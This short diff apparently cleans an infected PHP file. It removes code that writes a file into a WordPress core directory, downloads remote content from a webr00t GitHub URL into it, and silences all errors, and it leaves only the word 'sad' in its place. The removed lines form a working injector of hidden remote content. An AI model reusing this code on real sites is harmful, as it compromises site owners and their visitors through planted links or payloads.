@@ -1,11 +1,1 @@
-$yol = $_SERVER["DOCUMENT_ROOT"]."/wp-includes/Requests/Response/Response.php";
-if ( file_exists( $yol ) ) {
-//unlink($yol);
-}else {
-@touch($yol);
-$yaz = @file_get_contents("https://raw.githubusercontent.com/webr00t/web/master/lnks.txt");
-@$kayit = fopen($yol, "a"); 
-@fwrite($kayit,$yaz);
-@fwrite($kayit,"\r\r");
-@fclose($kayit);
- }
+sad
